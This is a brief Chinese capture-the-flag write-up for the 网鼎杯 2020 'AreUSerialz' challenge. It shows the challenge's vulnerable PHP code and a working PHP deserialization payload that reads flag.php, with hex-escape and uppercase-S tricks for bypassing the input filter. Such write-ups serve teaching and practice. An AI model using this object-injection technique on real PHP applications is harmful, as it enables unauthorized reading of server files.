# [网鼎杯 2020 青龙组]AreUSerialz

1. 打开页面得到源代码

```PHP
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```



2. 修改代码，构造反序列化Payload

![image-20211012161630268](https://i.loli.net/2021/10/12/rhepcVZ6SDda1Ji.png)

![image-20211012161817004](../../../../../../Users/apple/Library/Application Support/typora-user-images/image-20211012161817004.png)

```basic
O:11:"FileHandler":3:{s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";s:6:"123456";}
```

修改Payload:

- 使用十六进制绕过字符范围检测
- 小写s替换为大写S
- *号前后的**%00**替换为**\00**
- 添加`R:2`

```
O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:6:"123456";R:2}
```

![image-20211012162927972](https://i.loli.net/2021/10/12/OA3eoMnjbvykCVg.png)



Get Flag!